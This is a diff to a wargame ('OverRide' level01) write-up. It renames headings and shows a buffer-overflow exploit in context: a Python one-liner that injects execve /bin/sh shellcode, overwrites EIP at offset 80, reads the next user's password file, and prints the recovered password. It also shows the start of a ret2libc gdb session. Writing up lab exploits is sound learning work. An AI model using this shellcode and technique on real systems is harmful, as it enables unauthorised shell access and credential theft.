@@ -160,7 +160,8 @@ Program received signal SIGSEGV, Segmentation fault.
 ```
 Program exit on `EIP` value 0x37634136 which gives offset of 80 bytes.
 
-## ret2shellcode
+## Exploit
+### ret2shellcode
 As `a_user_name` is defined with 100 bytes, a shell code can be placed after `dat_wil` and EIP overwritten to `a_user_name+7`.
 ```shell
 level01@OverRide:~$ (python -c "import struct; print('dat_wil\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + '\n' + 'A'*80 + struct.pack('I', 0x0804a047))"; echo 'cat /home/users/$(whoami)/.pass') | ./level01
@@ -172,7 +173,7 @@ nope, incorrect password...
 
 PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
 ```
-## ret2libc
+### ret2libc
 ```gdb
 gdb-peda$ break *main+164
 Breakpoint 1 at 0x8048574
